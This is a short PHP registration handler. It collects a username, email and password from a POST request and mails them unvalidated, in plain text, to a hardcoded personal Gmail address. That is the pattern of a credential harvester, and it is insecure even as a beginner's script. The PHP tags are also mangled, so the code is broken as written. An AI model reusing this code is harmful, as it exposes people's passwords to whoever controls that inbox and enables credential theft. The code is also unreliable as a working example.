< ? php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $email = $_POST["email"];
  $password = $_POST["password"];

  // You should perform validation and sanitization here

  $to = "sameerkhandj70@gmail.com";
  $subject = "New Registration";
  $message = "Username: $username\nEmail: $email\nPassword: $password";

  // Use mail() function to send the email
  mail($to, $subject, $message);

  // You can redirect the user to a thank you page or display a success message here
} ?
>